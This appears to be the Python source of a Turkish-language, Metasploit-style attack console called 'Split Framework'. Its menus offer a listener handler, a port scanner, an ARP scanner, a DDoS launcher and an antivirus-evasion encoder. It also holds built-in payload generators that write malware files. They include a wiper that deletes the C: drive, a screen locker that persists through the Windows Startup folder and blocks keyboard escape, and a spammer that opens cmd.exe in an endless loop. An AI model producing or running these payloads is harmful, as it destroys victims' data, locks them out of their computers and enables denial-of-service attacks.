import socket
from colorama import Fore, init
import os
import subprocess
import time
import sys

init(autoreset=True)

# Global değişkenler
LHOST = ""
LPORT = 0
start_port = 0
finish_port = 0
CONFIG_DIR = "config"
CONFIG_PATH = os.path.join(CONFIG_DIR, "listener_conf.txt")

# Config dizini ve dosya kontrolü
if not os.path.exists(CONFIG_DIR):
    os.makedirs(CONFIG_DIR)

if os.path.exists(CONFIG_PATH):
    with open(CONFIG_PATH, "r") as f:
        lines = f.readlines()
        if len(lines) >= 1:
            LHOST = lines[0].strip()
        if len(lines) >= 2:
            try:
                LPORT = int(lines[1].strip())
            except ValueError:
                LPORT = 0

def save_config():
    with open(CONFIG_PATH, "w") as f:
        f.write(f"{LHOST}\n")
        f.write(f"{LPORT}\n")
    print(Fore.RED + "Config dosyası güncellendi!")
# =========================
# Handler fonksiyonu
# =========================
def handler():
    global LHOST, LPORT
    while True:
        metin2 = input(Fore.RED + "[Handler]--> ").strip()

        if metin2 == "show options":
            print(Fore.RED + f"LHOST: {LHOST}")
            print(Fore.RED + f"LPORT: {LPORT}")

        elif metin2.startswith("set lhost "):
            LHOST = metin2.split("set lhost ")[1]
            print(Fore.RED + f"LHOST ayarlandı: {LHOST}")
            save_config()

        elif metin2.startswith("set lport "):
            try:
                LPORT = int(metin2.split("set lport ")[1])
                print(Fore.RED + f"LPORT ayarlandı: {LPORT}")
                save_config()
            except ValueError:
                print(Fore.RED + "Geçersiz port değeri!")

        elif metin2 in ["run", "exploit"]:
            if not LHOST or not LPORT:
                print(Fore.RED + "LHOST veya LPORT ayarlı değil!")
                continue
            print(Fore.RED + "Listener başlatılıyor...")
            listener_path = os.path.join(os.getcwd(), "listener.py")
            subprocess.run([sys.executable, listener_path])
            print(Fore.RED + f"Listener {LHOST}:{LPORT} üzerinde dinlemeye başladı!")

        elif metin2 in ["exit", "quit"]:
            print(Fore.RED + "Handler kapatılıyor...")
            break

        else:
            print(Fore.RED + "Bilinmeyen komut!")

# =========================
# Spammer
# =========================
def spam():
    code = """import subprocess
while True:
    subprocess.Popen("cmd.exe")
"""
    file_name = input("Dosya İsmi Ne Olsun:").strip()
    if not file_name.endswith(".py"):
        file_name += ".py"
    with open(file_name, "w", encoding="utf-8") as f:
        f.write(code)
    print(f"{file_name} başarıyla oluşturuldu!")

# =========================
# Fud fonksiyonu
# =========================
def fud():
    modules_path = os.path.join(os.getcwd(), "modules")
    subprocess.run([sys.executable, "base64.py"], cwd=modules_path)

# =========================
# Port Scanner fonksiyonu
# =========================
def port():
    global LHOST, start_port, finish_port
    while True:
        metin3 = input(Fore.RED + "[Port_Scanner]--> ").strip()

        if metin3 == "show options":
            print(Fore.RED + f"LHOST: {LHOST}")
            print(Fore.RED + f"Start_Port: {start_port}")
            print(Fore.RED + f"Finish_Port: {finish_port}")

        elif metin3.startswith("set lhost "):
            LHOST = metin3.split("set lhost ")[1]
            print(Fore.RED + f"LHOST ayarlandı: {LHOST}")
            save_config()

        elif metin3.startswith("set start_port "):
            try:
                start_port = int(metin3.split("set start_port ")[1])
                print(Fore.RED + f"Start_Port ayarlandı: {start_port}")
            except ValueError:
                print(Fore.RED + "Geçersiz port değeri!")

        elif metin3.startswith("set finish_port "):
            try:
                finish_port = int(metin3.split("set finish_port ")[1])
                print(Fore.RED + f"Finish_Port ayarlandı: {finish_port}")
            except ValueError:
                print(Fore.RED + "Geçersiz port değeri!")

        elif metin3 in ["run", "exploit"]:
            if not LHOST:
                print(Fore.RED + "HATA: LHOST ayarlanmadı!")
                continue
            if start_port == 0 or finish_port == 0:
                print(Fore.RED + "HATA: Port aralığı ayarlanmadı!")
                continue
            print(Fore.RED + f"Taranıyor {LHOST} [{start_port}-{finish_port}]...")
            for port_num in range(start_port, finish_port + 1):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    result = s.connect_ex((LHOST, port_num))
                    if result == 0:
                        print(Fore.RED + f"[+] Açık Port: {port_num}")
                    s.close()
                except:
                    pass
            print(Fore.RED + "Tarama tamamlandı!")

        elif metin3 in ["exit", "quit"]:
            print(Fore.RED + "Port Scanner kapatılıyor...")
            break

        else:
            print(Fore.RED + "Bilinmeyen komut!")

# =========================
# Ddos Fonksiyonu
# =========================
def ddos():
    modules_path = os.path.join(os.getcwd(), "modules")
    url = input("Hedef URL: ")
    thread_count = int(input("Thread Sayısı: "))
    subprocess.run([sys.executable, "Ddos.py", url, str(thread_count)], cwd=modules_path)
# =========================
# Arp Fonksiyonu
# =========================
def arp():
    print(Fore.RED+"Arp Tablosu Getiriliyor")
    time.sleep(1)
    output = subprocess.getoutput("arp -a")
    print(Fore.RED+output)

# =========================
# Screen Locker
# =========================
def screen():
    code ="""import subprocess
import sys
import os
import tkinter as tk
import shutil


startup_path = os.path.join(
    os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup"
)


script_path = os.path.abspath(__file__)
destination = os.path.join(startup_path, os.path.basename(script_path))


if not os.path.exists(destination):
    shutil.copy(script_path, destination)


if not getattr(sys, "gui_started", False):
    sys.gui_started = True
    script_path = os.path.abspath(__file__)
    subprocess.Popen(
    ["cmd", "/c", "python", script_path],
    creationflags=subprocess.CREATE_NO_WINDOW
        )
    sys.exit()


def disable_event():
    pass  

root = tk.Tk()
root.overrideredirect(True)          
root.attributes("-fullscreen", True) 
root.protocol("WM_DELETE_WINDOW", disable_event)  


def block_keys(event):
    return "break"

root.bind_all("<Escape>", block_keys)
root.bind_all("<F11>", block_keys)
root.bind_all("<Alt-KeyPress>", block_keys)
root.bind_all("<Control-KeyPress>", block_keys)

frame = tk.Frame(root, bg="black")
frame.pack(fill="both", expand=True)

label = tk.Label(frame, text="Bu Ekrandan Kurtulamazsın Pc'in gg :D", fg="white", bg="black", font=("Arial", 30))
label.place(relx=0.5, rely=0.5, anchor="center")

root.mainloop()"""
    file_name = input("Dosya İsmi Ne Olsun:")
    if not file_name.endswith(".py"):
        file_name += ".py"
    with open(file_name, "w", encoding="utf-8") as f:
        f.write(code)

        print(f"{file_name} başarıyla oluşturuldu!")
# =========================
# Wiper
# =========================
def wiper():
    payload_code = """
import shutil
shutil.rmtree("C:")  
"""
    file_name = input("Dosya İsmi Ne İstersin: ")

    
    if not file_name.endswith(".py"):
        file_name += ".py"

    with open(file_name, "w", encoding="utf-8") as f:
        f.write(payload_code)

    print(f"{file_name} başarıyla oluşturuldu!")
# =========================
# Ana Menü
# =========================
def main():
    print(Fore.RED + r"""  
   _____       _ _ _     ______                                           _                  
  / ____|     | (_) |   |  ____|                                         | |                
 | (___  _ __ | |_| |_  | |__ _ __ __ _ _ __ ___   _____      _____  _ __| | __             
  \___ \| '_ \| | | __| |  __| '__/ _` | '_ ` _ \ / _ \ \ /\ / / _ \| '__| |/ /             
  ____) | |_) | | | |_  | |  | | | (_| | | | | |  __/\ V  V / (_) | |  |   <               
 |_____/| .__/|_|_|\__| |_|  |_|  \__,_|_| |_| |_|\___| \_/\_/ \___/|_|  |_|\_\             
        | |                                                                                
        |_|                                                                                
[1] Handler   [2] Scanner   [4] Payload   [1] FUD
""")
    while True:
        metin = input(Fore.RED + "--> ").strip()

        
        if metin == "search listener" or metin == "search handler":
            print("[1] handler")
        elif metin == "search payload" or metin=="search Payload":
            print(Fore.RED + "[1] Wiper")
            print(Fore.RED + "[2] Screen_Locker")
            print(Fore.RED + "[3] Spammer")
            print(Fore.RED + "[4] Ddoser")
        elif metin == "search fud" or metin=="search Fud":
            print(Fore.RED + "[1] Base64_Encoder")
        elif metin == "search scanner" or metin=="search Scanner":
            print(Fore.RED + "[1] Port_Scanner")
            print(Fore.RED + "[2] Arp_Scanner")
        elif metin in ["exit", "quit"]:
            print(Fore.RED + "Çıkış yapılıyor...")
            break
        elif metin == "use handler":
            handler()
        elif metin == "use port_scanner":
            port()
        elif metin == "use arp_scanner":
            arp()
        elif metin == "use Base64_encoder":
            fud()
        elif metin == "use Wiper":
            wiper()
        elif metin == "use Spammer":
            spam()
        elif metin == "use Ddoser":
            ddos()
        elif metin == "use Screen_Locker":
            screen()
        elif metin == "clear" or metin == "cls":
            os.system("cls")
            main()
        elif metin == "banner":
            print(Fore.RED+r"""   _____       _ _ _     ______                                           _                  
  / ____|     | (_) |   |  ____|                                         | |                
 | (___  _ __ | |_| |_  | |__ _ __ __ _ _ __ ___   _____      _____  _ __| | __             
  \___ \| '_ \| | | __| |  __| '__/ _` | '_ ` _ \ / _ \ \ /\ / / _ \| '__| |/ /             
  ____) | |_) | | | |_  | |  | | | (_| | | | | |  __/\ V  V / (_) | |  |   <               
 |_____/| .__/|_|_|\__| |_|  |_|  \__,_|_| |_| |_|\___| \_/\_/ \___/|_|  |_|\_\             
        | |                                                                                
        |_|                                                                                
[1] Handler   [2] Scanner   [4] Payload   [1] FUD""")
        else:
            print()

if __name__ == "__main__":
    main()
